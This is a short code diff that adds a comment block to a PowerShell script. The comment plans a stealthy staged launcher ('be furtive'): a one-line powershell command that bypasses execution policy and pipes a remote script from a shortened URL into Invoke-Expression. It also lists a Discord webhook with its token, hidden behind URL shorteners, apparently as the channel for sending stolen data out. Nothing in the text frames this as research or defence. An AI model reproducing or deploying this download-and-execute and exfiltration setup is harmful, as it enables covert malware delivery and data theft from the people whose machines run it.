@@ -1,3 +1,17 @@
+<# 
+
+Execute command having a max caracters to put into, I need to shorten the links for the command to be as short as possible.
+Stage2_test url : 
+                    https://rb.gy/vk584t
+Discord Webhook : 
+                    https://discord.com/api/webhooks/1199773516900352161/k8dAsA1xT4os6JLC8WstxzDyrhnmw2R2UrdT3AxcYWbifQppCDgAO9q3zcLY0756svJy
+                    https://bit.ly/3UitWdv
+                    https://rb.gy/91905n
+
+Invoke powershell + stage 2 into it + be furtive : 
+powershell -Ep Bypass -Command "& {Set-Variable -Name DiscordUrl -Value 'https://rb.gy/91905n'; irm https://rb.gy/vk584t | iex}" -ArgumentList
+
+#>
 # Function to handle the temporary directory
 function TempDir {
     # Check if the C:\temp directory exists
